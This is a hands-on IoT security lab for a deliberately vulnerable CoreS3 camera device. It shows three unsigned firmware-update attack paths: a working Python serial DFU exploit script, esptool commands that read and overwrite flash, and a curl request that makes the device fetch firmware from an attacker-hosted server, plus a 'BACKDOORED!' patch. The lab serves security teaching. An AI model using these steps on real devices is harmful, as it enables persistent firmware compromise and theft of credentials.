# L25: Serial Firmware Update (Unsigned DFU)

## Goal
Exploit unsigned firmware update mechanisms to install arbitrary firmware on the CoreS3 device via the serial console, demonstrating the lack of secure boot and firmware signature verification.

## Background

**Why this matters**: Firmware update mechanisms without signature verification allow attackers with brief physical access to install arbitrary firmware. Once an attacker controls the firmware, they control everything: credentials, network access, sensor data, and device behavior.

**What you're looking for in IoT devices:**
- Firmware update commands accessible via USB serial console
- ROM bootloader modes accessible via button combinations or pin shorting
- No signature verification on firmware uploaded via DFU or OTA
- OTA update endpoints that accept arbitrary firmware images
- Bootloader configurations that allow unsigned code execution

**Why this happens:**
- DFU mode accepts any firmware without cryptographic signatures
- Physical access is assumed safe by developers
- Signature checks disabled during development and never re-enabled
- ESP32-S3 secure boot requires burning one-time-programmable eFuses, which many manufacturers skip
- Adding signature verification increases build complexity and requires key management

**On CoreS3**: Three unsigned firmware update vectors exist. (A) The `usb-dfu <size>` serial command accepts raw bytes over USB CDC and writes them to flash via the Arduino `Update` library without signature verification. (B) Holding G0 while pressing RESET enters the ESP32-S3 ROM bootloader, which accepts firmware via `esptool.py` - also unsigned. (C) The `/ota` HTTP endpoint accepts unsigned firmware over the network. None check secure boot eFuses (not burned on this device).

```cpp
// From SerialShell.cpp - usbDFU()
void SerialShell::usbDFU(uint32_t size) {
    if (!Update.begin(size)) { return; }  // No signature check

    while (received < size) {
        int n = DualSerial.readBytes((char*)buffer, toRead);
        Update.write(buffer, n);  // Raw bytes written directly to flash
        received += n;
    }

    Update.end();  // Firmware accepted without any integrity check
    ESP.restart();
}
```

**DFU attack flows:**

```
Attack Vector A: Serial command DFU
+--------+     USB CDC      +----------+     Update.write()    +-------+
| Attack |  usb-dfu <size>  | Serial   |  raw firmware bytes   | Flash |
| Host   | --------------> | Shell    | --------------------> |       |
+--------+  firmware bytes  +----------+  no sig verification  +-------+

Attack Vector B: ROM bootloader
+--------+   GPIO0+RESET    +----------+     esptool.py        +-------+
| Attack |  enter download  | ROM Boot |  write_flash 0x0      | Flash |
| Host   | --------------> | loader   | --------------------> |       |
+--------+                  +----------+  no sig verification  +-------+

Attack Vector C: HTTP OTA endpoint
+--------+   POST /ota      +----------+     HTTP GET firmware  +-------+
| Attack |  {"url":"..."}   | Web      |  Update.writeStream() | Flash |
| Host   | --------------> | Server   | --------------------> |       |
+--------+                  +----------+  no sig verification  +-------+
```

**Finding USB interfaces on unknown devices:**

1. **Physical inspection:** Look for USB connectors (Type-C, Micro-USB), USB controller chips (FT232, CH340, CP2102), D+/D- test points
2. **USB enumeration:** `lsusb` for VID/PID, check device class (CDC, HID, DFU, Mass Storage)
3. **Finding DFU mode:** Try BOOT+RESET combos, check datasheet for boot modes, look for serial shell commands (`usb-dfu`, `update`, `flash`), run `esptool.py chip_id`
4. **Common DFU implementations:** STM32 (BOOT0 pin), ESP32-S3 (GPIO0/G0 button), Nordic nRF (buttonless DFU over BLE/USB)

## Hardware Setup

**What you need:**
- CoreS3 device connected via USB-C cable
- Linux machine with Python 3, `pyserial`, and `esptool.py`
- A firmware binary to flash (original backup, modified version, or test binary)

**Installing dependencies:**
```bash
pip install esptool pyserial

esptool.py version
# Expected: esptool.py v4.x.x

ls -la /dev/ttyACM*
# Expected: /dev/ttyACM0 (USB CDC serial)
```

**Prerequisite - Admin mode:** The `usb-dfu` serial command requires admin privileges. Use `login <admin_pin>` first. Without it:

```
[USB-DFU] Admin privileges required.
```

## Lab Walkthrough

### Step 1: Back Up the Original Firmware

Read current firmware from flash for later restoration. This also demonstrates that flash can be read without authentication.

```bash
# Read the application partition (starts at 0x10000, 3MB)
esptool.py --port /dev/ttyACM0 --baud 921600 read_flash 0x10000 0x300000 firmware_backup.bin

# Expected output:
# esptool.py v4.7.0
# Serial port /dev/ttyACM0
# Connecting...
# Detecting chip type... ESP32-S3
# ...
# Read 3145728 bytes at 0x00010000 in 36.2 seconds (694.8 kbit/s)...

ls -la firmware_backup.bin
# Expected: -rw-r--r-- 1 user user 3145728 ... firmware_backup.bin

# Check for plaintext secrets in the firmware
strings firmware_backup.bin | grep -i "pin\|jwt\|secret\|password" | head -10
```

**Note:** If the device is not in download mode, you may need to enter it first (see Step 3). Some ESP32-S3 boards support auto-reset via USB CDC.

### Step 2: Attack Vector A - Serial Command DFU

Use the `usb-dfu` serial command to upload firmware over USB CDC.

```bash
# Connect to serial console
pio device monitor -b 115200

# The usb-dfu command requires admin mode
cores3-cam> login YYYYYY
Admin mode unlocked.

# Test the DFU command
cores3-cam> usb-dfu 0

# Expected:
# Usage: usb-dfu <size_bytes>
# Example: usb-dfu 262144  (then send 256KB of firmware data)

# Initiate DFU with firmware size
cores3-cam> usb-dfu 1048576

# Expected:
# [DFU] Starting USB serial firmware update (1048576 bytes expected)
# Device now waits for raw firmware bytes over serial (30 second timeout)

# Press Ctrl+C to exit pio device monitor
```

The command calls `Update.begin(size)` without signature verification, writes bytes directly via `Update.write()`, then `Update.end()` finalizes and reboots.

To send firmware programmatically:

```python
#!/usr/bin/env python3
"""usb_dfu_exploit.py - Flash unsigned firmware via serial DFU command.

Usage: python3 usb_dfu_exploit.py <firmware.bin>
"""
import serial
import time
import sys
import os

if len(sys.argv) < 2:
    print("Usage: python3 usb_dfu_exploit.py <firmware.bin>")
    sys.exit(1)

firmware_path = sys.argv[1]
firmware_size = os.path.getsize(firmware_path)
print(f"[*] Firmware: {firmware_path} ({firmware_size} bytes)")

ser = serial.Serial('/dev/ttyACM0', 115200, timeout=5)
time.sleep(1)
ser.read(ser.in_waiting)

# Send DFU command with firmware size
dfu_cmd = f'usb-dfu {firmware_size}\r\n'
print(f"[*] Sending: {dfu_cmd.strip()}")
ser.write(dfu_cmd.encode())
time.sleep(0.5)

response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
print(f"[*] Response: {response.strip()}")

if "Starting USB serial firmware update" not in response:
    print("[-] DFU command not accepted.")
    ser.close()
    sys.exit(1)

# Send firmware bytes in chunks
print(f"[*] Sending {firmware_size} bytes of firmware...")
with open(firmware_path, 'rb') as f:
    sent = 0
    while sent < firmware_size:
        chunk = f.read(256)
        if not chunk:
            break
        ser.write(chunk)
        sent += len(chunk)
        if sent % 10240 == 0:
            pct = (sent / firmware_size) * 100
            print(f"[*] Progress: {sent}/{firmware_size} ({pct:.1f}%)")

print(f"[+] Sent {sent} bytes")

time.sleep(3)
final = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
print(f"[*] Final response: {final.strip()}")

# Expected: [DFU] Firmware updated over USB serial
#           [DFU] Rebooting into new firmware...

ser.close()
print("[+] DFU exploit complete. Device is rebooting with new firmware.")
```

```bash
python3 usb_dfu_exploit.py firmware_backup.bin

# Expected:
# [*] Firmware: firmware_backup.bin (1048576 bytes)
# [*] Sending: usb-dfu 1048576
# [*] Response: [DFU] Starting USB serial firmware update (1048576 bytes expected)
# [*] Sending 1048576 bytes of firmware...
# ...
# [+] DFU exploit complete. Device is rebooting with new firmware.
```

### Step 3: Attack Vector B - ROM Bootloader

Enter the ESP32-S3 ROM bootloader via hardware buttons and flash with `esptool.py`. This bypasses all application-level security and works even if the serial shell is disabled.

```bash
# Enter ROM bootloader mode:
# 1. Hold the G0 button (small button on the side, labeled BOOT)
# 2. Press and release RESET (while still holding G0)
# 3. Release G0

# Verify ROM bootloader is active
esptool.py --port /dev/ttyACM0 chip_id

# Expected:
# Chip is ESP32-S3 (QFN56) (revision v0.2)
# Features: WiFi, BLE, Embedded PSRAM 8MB (AP_3v3)
# Crystal is 40MHz
# MAC: xx:xx:xx:xx:xx:xx

# Check secure boot status
esptool.py --port /dev/ttyACM0 get_security_info

# Expected (partial):
# Secure Boot: NOT enabled
# Flash Encryption: NOT enabled
```

```bash
# Flash firmware (unsigned, no verification)
esptool.py --port /dev/ttyACM0 --baud 921600 \
  write_flash 0x10000 firmware_backup.bin

# Expected:
# Compressed 1048576 bytes to 523456...
# Wrote 1048576 bytes (523456 compressed) at 0x00010000 in 6.2 s
# Hash of data verified.
# Hard resetting via RTS pin...
```

The "Hash of data verified" message only verifies transfer integrity (CRC), NOT a cryptographic signature. No credentials or keys are needed. The entire flash can be overwritten, including the bootloader and partition table.

### Step 4: Attack Vector C - HTTP OTA Endpoint

The `/ota` endpoint fetches firmware over plain HTTP without TLS or signature verification.

```bash
# Host a firmware file on your machine
python3 -m http.server 8080 &

# Trigger OTA update
curl -X POST http://192.168.4.1/ota \
  -H "Content-Type: application/json" \
  -d '{"url":"http://192.168.4.100:8080/firmware_backup.bin"}'

# Expected response:
# {"status":"accepted","message":"OTA update started","warning":"No signature verification!","url":"http://192.168.4.100:8080/firmware_backup.bin"}
```

The endpoint accepts a URL with no authentication, downloads over HTTP (not HTTPS), and writes to flash without signature verification.

### Step 5: Create a Modified Firmware (Proof of Concept)

Demonstrate impact by patching a firmware binary.

```bash
cp firmware_backup.bin firmware_modified.bin

python3 << 'EOF'
with open('firmware_modified.bin', 'rb') as f:
    data = bytearray(f.read())

target = b'1.0.0-debug'
replacement = b'BACKDOORED!'
idx = data.find(target)

if idx >= 0:
    print(f"[+] Found version string at offset 0x{idx:X}")
    data[idx:idx+len(replacement)] = replacement
    with open('firmware_modified.bin', 'wb') as f:
        f.write(data)
    print(f"[+] Patched version string to '{replacement.decode()}'")
else:
    print("[-] Version string not found (firmware may be compressed)")
    print("[*] In a real attack, you would build custom firmware from source")
EOF

# Flash the modified firmware via any attack vector
python3 usb_dfu_exploit.py firmware_modified.bin
```

### Step 6: Verify the Attack and Restore

Confirm the modified firmware is running, then restore the original.

```bash
pio device monitor -b 115200

cores3-cam> status
# Look for the modified version string

# Restore original firmware
# Option A: Via serial DFU
python3 usb_dfu_exploit.py firmware_backup.bin

# Option B: Via ROM bootloader (most reliable)
# Hold G0, press RESET, release G0
esptool.py --port /dev/ttyACM0 --baud 921600 \
  write_flash 0x10000 firmware_backup.bin

# Verify restoration
pio device monitor -b 115200
cores3-cam> status
# Should show original firmware version
```

## Impact

- **Full device compromise**: Three unsigned update vectors (serial DFU, ROM bootloader, HTTP OTA) allow installing arbitrary firmware.
- **Persistent backdoor**: Modified firmware persists across reboots until reflashed.
- **No secure boot**: ESP32-S3 secure boot eFuses not burned; ROM bootloader accepts any firmware.
- **Brief physical access sufficient**: Serial DFU takes under 60 seconds. ROM bootloader needs only two button presses plus `esptool.py`.
- **Network-based attack**: The `/ota` endpoint enables remote firmware replacement without physical access.
- **Supply chain risk**: Devices in transit can be intercepted and reflashed ("evil maid" attack).
- **Real-world parallel**: Unsigned firmware updates have been exploited in Hikvision/Dahua cameras, smart locks, industrial PLCs, and medical devices.

## References

- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [ESP-IDF OTA Update API](https://docs.espressif.com/projects/esp-idf/en/stable/esp32s3/api-reference/system/ota.html)
- [CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
- [ESP32-S3 Secure Boot V2](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/secure-boot-v2.html)
- [ESP32-S3 Flash Encryption](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/flash-encryption.html)
- [esptool.py Documentation](https://docs.espressif.com/projects/esptool/en/latest/)
- [Arduino ESP32 Update Library](https://github.com/espressif/arduino-esp32/tree/master/libraries/Update)
- [OWASP Firmware Security Testing Methodology](https://owasp.org/www-project-firmware-security-testing-methodology/)
